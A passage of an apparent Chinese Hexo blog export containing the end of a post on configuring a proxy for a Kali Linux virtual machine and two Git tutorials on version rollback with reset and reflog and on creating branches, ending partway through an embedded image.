</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">root@shawn#</span><span class="bash">:vim /etc/profile</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 添加</span></span><br><span class="line">http_proxy=ip:port</span><br><span class="line">https_proxy=ip:port</span><br><span class="line"></span><br><span class="line">export http_proxy</span><br><span class="line">export https_proxy</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 保存后，执行</span></span><br><span class="line"><span class="meta">root@shawn#</span><span class="bash">:<span class="built_in">source</span> /etc/profile</span></span><br></pre></td></tr></table></figure>

<ol start="3">
<li>测试</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">root@shawn#</span><span class="bash">: wget https://www.google.com</span></span><br><span class="line">--2020-02-18 21:58:33--  http://www.google.com/</span><br><span class="line">正在连接 192.168.0.112:1080... 已连接。</span><br><span class="line">已发出 Proxy 请求，正在等待回应... 200 OK</span><br><span class="line">长度：未指定 [text/html]</span><br><span class="line">正在保存至: “index.html”</span><br><span class="line"></span><br><span class="line">index.html              [  &lt;=&gt;               ]  11.61K  --.-KB/s  用时 1.0s    </span><br><span class="line"></span><br><span class="line">2020-02-18 21:58:36 (12.2 KB/s) - “index.html” 已保存 [11886]</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>v2ray注意点</li>
</ol>
<p>在v2ray中直接开启<code>允许来自局域网连接</code>，然后按照上述配置10808端口后，你会发现还是无法连接，用wget测试terminal报如下错误</p>
<p><img src="/2020/03/01/Vmware%E4%B8%8BKali-Linux-%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/Snipaste_2020-10-29_10-51-03.png" alt></p>
<p>查看v2ray的日志</p>
<p><img src="/2020/03/01/Vmware%E4%B8%8BKali-Linux-%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/Snipaste_2020-10-29_10-52-57.png" alt></p>
<p>问题的原因是，v2ray有SOCKS5代理端口和HTTP代理端口，如下图（端口被我改过）</p>
<p><img src="/2020/03/01/Vmware%E4%B8%8BKali-Linux-%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/Snipaste_2020-10-29_10-53-59.png" alt></p>
<p>注意v2ray需要填写正确端口</p>
<h2 id="0x03-全局配置"><a href="#0x03-全局配置" class="headerlink" title="0x03 全局配置"></a>0x03 全局配置</h2><p>说到全局配置，当然直接就在kali的网络设置中配置代理</p>
<p><img src="/2020/03/01/Vmware%E4%B8%8BKali-Linux-%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/daili.jpg" alt></p>
<p>网络设置-&gt;Network Proxy，写入ssr所在主机地址:端口</p>
<p><img src="/2020/03/01/Vmware%E4%B8%8BKali-Linux-%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/shoudong.jpg" alt></p>
<p>OK，可以上网了</p>
<p><img src="/2020/03/01/Vmware%E4%B8%8BKali-Linux-%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/proof.jpg" alt></p>
<h2 id="0x0X-学习资源"><a href="#0x0X-学习资源" class="headerlink" title="0x0X 学习资源"></a>0x0X 学习资源</h2><p><a href="https://nickfu.com/p/212" target="_blank" rel="noopener">centos通过ssr上网</a></p>
<p><a href="https://blog.csdn.net/qq_24314631/article/details/100996531" target="_blank" rel="noopener">kali虚拟机通过ssr上网</a></p>
]]></content>
      <categories>
        <category>东搞西搞</category>
      </categories>
      <tags>
        <tag>Kali Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Git学习(三)版本回退</title>
    <url>/2020/03/01/Git%E5%AD%A6%E4%B9%A0-%E4%B8%89-%E7%89%88%E6%9C%AC%E5%9B%9E%E9%80%80/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="0x01-查看仓库状态"><a href="#0x01-查看仓库状态" class="headerlink" title="0x01 查看仓库状态"></a>0x01 查看仓库状态</h2><ul>
<li><code>git status</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git status</span></span><br><span class="line">On branch hexo</span><br><span class="line">nothing to commit, working tree clean</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> 3333333333333 &gt;&gt; x.txt</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> git status</span></span><br><span class="line">On branch hexo</span><br><span class="line">Changes not staged for commit:</span><br><span class="line">  (use "git add &lt;file&gt;..." to update what will be committed)</span><br><span class="line">  (use "git restore &lt;file&gt;..." to discard changes in working directory)</span><br><span class="line">        modified:   x.txt</span><br><span class="line"></span><br><span class="line">no changes added to commit (use "git add" and/or "git commit -a")</span><br></pre></td></tr></table></figure>

<a id="more"></a>能够查看当前仓库状态，从上得知`x.txt`被修改过，但是想要知道什么内容被修改过就要使用`git diff`

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git diff x.txt</span></span><br><span class="line">warning: LF will be replaced by CRLF in x.txt.</span><br><span class="line">The file will have its original line endings in your working directory</span><br><span class="line">diff --git a/x.txt b/x.txt</span><br><span class="line">index 140fb9b..e63237b 100644</span><br><span class="line">--- a/x.txt</span><br><span class="line">+++ b/x.txt</span><br><span class="line">@@ -1,3 +1,4 @@</span><br><span class="line"> aaaaaaaaaaaaaaaaaa</span><br><span class="line"> bbbbbbbbbbbbbbbb</span><br><span class="line"> cccccccccccccccccccc@222</span><br><span class="line">+3333333333333</span><br></pre></td></tr></table></figure>



<h2 id="0x02-HEAD指针"><a href="#0x02-HEAD指针" class="headerlink" title="0x02 HEAD指针"></a>0x02 HEAD指针</h2><p>HEAD是当前分支最近一次提交的引用</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat .git/HEAD</span></span><br><span class="line">ref: refs/heads/hexo</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> git checkout master</span></span><br><span class="line">Switched to branch 'master'</span><br><span class="line">M       x.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> cat .git/HEAD</span></span><br><span class="line">ref: refs/heads/master</span><br></pre></td></tr></table></figure>

<p>不过，HEAD指针默认指向当前分支指针（branch pointer），但可能引用与当前分支名称不相关的的commit时，我们称这种为<code>游离HEAD(detached HEAD)</code>，在这种情况下使用<code>git commit</code>产生的是快照</p>
<p>图</p>
<p>图</p>
<p>文字</p>
<h2 id="0x03-版本回退"><a href="#0x03-版本回退" class="headerlink" title="0x03 版本回退"></a>0x03 版本回退</h2><p>在使用git过程中，我们可能会误删文件，于是我们想回到最近一次或是特定某次commit，重新写文件。但是当提交次数过多我们就记不住到底是哪一次修改了什么内容，所以我们需要git来查看历史</p>
<ul>
<li><code>git log</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">log</span></span></span><br><span class="line">commit 1405868ee69c9b682e9caf0c0b182d297cea084e (HEAD -&gt; master, hexo)</span><br><span class="line">Author: peaceSh4wn &lt;iseonow877@sina.com&gt;</span><br><span class="line">Date:   Sat Feb 8 16:00:38 2020 +0800</span><br><span class="line"></span><br><span class="line">    add y.txt</span><br><span class="line"></span><br><span class="line">commit 116d8b76b22bec10dc0826c1181002ac4930f5b1</span><br><span class="line">Author: peaceSh4wn &lt;iseonow877@sina.com&gt;</span><br><span class="line">Date:   Sat Feb 8 15:55:02 2020 +0800</span><br><span class="line"></span><br><span class="line">    ok</span><br><span class="line"></span><br><span class="line">commit b4d9c9a9a72c8eaeb7bf596e050772d19cca64c8</span><br><span class="line">Author: peaceSh4wn &lt;iseonow877@sina.com&gt;</span><br><span class="line">Date:   Sat Feb 8 15:35:08 2020 +0800</span><br><span class="line"></span><br><span class="line">    first commit</span><br><span class="line">    </span><br><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">log</span> --pretty=oneline <span class="comment"># 单行显示</span></span></span><br><span class="line">1405868ee69c9b682e9caf0c0b182d297cea084e (HEAD -&gt; master, hexo) add y.txt</span><br><span class="line">116d8b76b22bec10dc0826c1181002ac4930f5b1 ok</span><br><span class="line">b4d9c9a9a72c8eaeb7bf596e050772d19cca64c8 first commit</span><br></pre></td></tr></table></figure>

<ul>
<li><code>git reset 某一版本</code></li>
</ul>
<p>我们使用<code>git reset HEAD^</code>回到当前上一个版本</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git reset HEAD^</span></span><br><span class="line">Unstaged changes after reset:</span><br><span class="line">M       x.txt</span><br></pre></td></tr></table></figure>

<p><code>git reset HEAD^^</code>回到当前上两个版本</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">log</span> --pretty=oneline</span></span><br><span class="line">282715040b9e65d9789827faa9a0110cf5d76fee (HEAD -&gt; master) delete x.txt</span><br><span class="line">6431293265114fc23433eee025e61e49273cf51c add z.txt and add string in the end of y.txt</span><br><span class="line">dc496fa5d34216b1538bf59e013d5e5cae332261 2</span><br><span class="line">b4d9c9a9a72c8eaeb7bf596e050772d19cca64c8 first commit</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> git reset HEAD^^</span></span><br><span class="line">Unstaged changes after reset:</span><br><span class="line">D       x.txt</span><br></pre></td></tr></table></figure>

<p><code>git reset HEAD~100</code>当前上100个版本</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git reset HEAD~100 <span class="comment"># 我们这里没有100多个版本，报错是必然的 XDD</span></span></span><br><span class="line">fatal: ambiguous argument 'HEAD~100': unknown revision or path not in the working tree.</span><br><span class="line">Use '--' to separate paths from revisions, like this:</span><br><span class="line">'git &lt;command&gt; [&lt;revision&gt;...] -- [&lt;file&gt;...]'</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">log</span> --pretty=oneline</span></span><br><span class="line">dc496fa5d34216b1538bf59e013d5e5cae332261 (HEAD -&gt; master) 2</span><br><span class="line">b4d9c9a9a72c8eaeb7bf596e050772d19cca64c8 first commit</span><br></pre></td></tr></table></figure>



<p>这里有一个问题：</p>
<p>我们查看历史发现之前的版本已经消失，但是如果我们还想回到之前删除的版本怎么做？</p>
<ul>
<li>答：如果当前操作的shell窗口没有关闭，向上翻一翻history，找到之前使用<code>git log</code>产生的哈希值，这样我们就可以回到未来！</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git reset --hard 28271</span></span><br><span class="line">HEAD is now at 2827150 delete x.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">log</span> --pretty=oneline</span></span><br><span class="line">dc496fa5d34216b1538bf59e013d5e5cae332261 (HEAD -&gt; master) 2</span><br><span class="line">b4d9c9a9a72c8eaeb7bf596e050772d19cca64c8 first commit</span><br></pre></td></tr></table></figure>



<p>可是问题又来了：</p>
<p>我们如果关掉了之前操作的shell窗口怎么办？</p>
<ul>
<li>答：<code>git reflog</code>命令可以救你一命。它记录了你的每一次命令中的commit id</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git reflog</span></span><br><span class="line">2827150 (HEAD -&gt; master) HEAD@&#123;0&#125;: reset: moving to 28271</span><br><span class="line">dc496fa HEAD@&#123;1&#125;: reset: moving to HEAD^</span><br><span class="line">6431293 HEAD@&#123;2&#125;: reset: moving to 6431</span><br><span class="line">2827150 (HEAD -&gt; master) HEAD@&#123;3&#125;: reset: moving to 2827</span><br><span class="line">6431293 HEAD@&#123;4&#125;: reset: moving to 6431</span><br><span class="line">2827150 (HEAD -&gt; master) HEAD@&#123;5&#125;: reset: moving to 2827</span><br><span class="line">dc496fa HEAD@&#123;6&#125;: reset: moving to HEAD^^</span><br><span class="line">2827150 (HEAD -&gt; master) HEAD@&#123;7&#125;: commit: delete x.txt</span><br><span class="line">6431293 HEAD@&#123;8&#125;: commit: add z.txt and add string in the end of y.txt</span><br><span class="line">dc496fa HEAD@&#123;9&#125;: commit: 2</span><br><span class="line">b4d9c9a HEAD@&#123;10&#125;: reset: moving to HEAD^</span><br><span class="line">116d8b7 HEAD@&#123;11&#125;: reset: moving to HEAD</span><br><span class="line">116d8b7 HEAD@&#123;12&#125;: reset: moving to HEAD^</span><br><span class="line">1405868 (hexo) HEAD@&#123;13&#125;: checkout: moving from hexo to master</span><br><span class="line">1405868 (hexo) HEAD@&#123;14&#125;: checkout: moving from master to hexo</span><br><span class="line">1405868 (hexo) HEAD@&#123;15&#125;: merge hexo: Fast-forward</span><br><span class="line">b4d9c9a HEAD@&#123;16&#125;: checkout: moving from hexo to master</span><br><span class="line">1405868 (hexo) HEAD@&#123;17&#125;: commit: add y.txt</span><br><span class="line">116d8b7 HEAD@&#123;18&#125;: commit: ok</span><br><span class="line">b4d9c9a HEAD@&#123;19&#125;: checkout: moving from master to hexo</span><br><span class="line">b4d9c9a HEAD@&#123;20&#125;: commit (initial): first commit</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> git reset --hard 28271</span></span><br><span class="line">HEAD is now at 2827150 delete x.txt</span><br></pre></td></tr></table></figure>



<h2 id="0xXX-学习资源"><a href="#0xXX-学习资源" class="headerlink" title="0xXX 学习资源"></a>0xXX 学习资源</h2><p><a href="https://blog.csdn.net/claroja/article/details/78858533" target="_blank" rel="noopener">HEAD指针&amp;Branch指针</a></p>
<p><a href="https://www.zsythink.net/archives/3412" target="_blank" rel="noopener">HEAD是啥？</a></p>
<p><a href="https://blog.csdn.net/yunfeng482/article/details/88260894" target="_blank" rel="noopener">理解HEAD指针</a></p>
]]></content>
      <categories>
        <category>开发工具</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>Git学习(二)分支</title>
    <url>/2020/03/01/Git%E5%AD%A6%E4%B9%A0-%E4%BA%8C-%E5%88%86%E6%94%AF/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>这次我们来学习一下git里的分支，它Todo，建议先用<a href="https://learngitbranching.js.org/" target="_blank" rel="noopener">learngitbranching</a>实操学习，在脑中建立一个实际的印象，再看blog</p>
<a id="more"></a>

<h2 id="0x01-新建分支"><a href="#0x01-新建分支" class="headerlink" title="0x01 新建分支"></a>0x01 新建分支</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git branch hexo <span class="comment"># 新建一个分支hexo</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> git branch <span class="comment"># 查看分支</span></span></span><br><span class="line">  hexo</span><br><span class="line">* master</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> git checkout hexo <span class="comment"># 将指针指向hexo分支</span></span></span><br><span class="line">Switched to branch 'hexo'</span><br></pre></td></tr></table></figure>

<ul>
<li>新建分支XXX同时将HEAD指针修改到XXX可以用<code>git checkout -b hexo</code>完成</li>
</ul>
<p>这里我们增加文件<code>y.txt</code>，再在文件<code>x.txt</code>后增添几个字符，在hexo分支下加入仓库并提交</p>
<p>可看到</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ll</span></span><br><span class="line">total 1</span><br><span class="line">-rw-r--r-- 1 Shawn 197121 63  2月  8 15:52 x.txt</span><br><span class="line">-rw-r--r-- 1 Shawn 197121  0  2月  8 16:00 y.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">log</span> <span class="comment"># 使用git log能够查看提交历史</span></span></span><br><span class="line">commit 1405868ee69c9b682e9caf0c0b182d297cea084e (HEAD -&gt; hexo)</span><br><span class="line">Author: peaceSh4wn &lt;i@sina.com&gt;</span><br><span class="line">Date:   Sat Feb 8 16:00:38 2020 +0800</span><br><span class="line"></span><br><span class="line">    add y.txt</span><br><span class="line"></span><br><span class="line">commit 116d8b76b22bec10dc0826c1181002ac4930f5b1</span><br><span class="line">Author: peaceSh4wn &lt;i@sina.com&gt;</span><br><span class="line">Date:   Sat Feb 8 15:55:02 2020 +0800</span><br><span class="line"></span><br><span class="line">    ok</span><br><span class="line"></span><br><span class="line">commit b4d9c9a9a72c8eaeb7bf596e050772d19cca64c8 (master)</span><br><span class="line">Author: peaceSh4wn &lt;i@sina.com&gt;</span><br><span class="line">Date:   Sat Feb 8 15:35:08 2020 +0800</span><br><span class="line"></span><br><span class="line">    first commit</span><br></pre></td></tr></table></figure>

<p><img src="data:image/png;base64,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